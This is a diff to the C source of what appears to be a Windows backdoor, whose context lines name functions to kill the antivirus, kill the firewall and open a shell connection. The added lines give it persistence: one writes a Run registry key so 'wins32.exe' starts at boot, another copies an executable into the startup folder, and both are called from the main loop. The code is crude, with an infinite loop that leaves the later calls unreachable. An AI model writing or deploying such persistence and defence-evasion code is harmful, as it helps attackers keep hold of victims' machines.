@@ -70,6 +70,26 @@ void kill_firewall()
 
   }
 
+  // function that auto copy the software into the register of target machine 
+
+void auto_copy() 
+
+  {
+
+     system("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe"); 
+     return;
+
+  }
+
+void copy_to_registry()
+  
+  {
+
+    system("copy /Y meuarquivo.exe C:\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar");
+    return;  
+  
+  }
+
   /* create connection */
   void shell()
 
@@ -108,7 +128,8 @@ void kill_firewall()
     while(1)
 
     shell();
-
+    auto_copy();
+    copy_to_registry();
     kill_antivirus();
     kill_firewall();
 
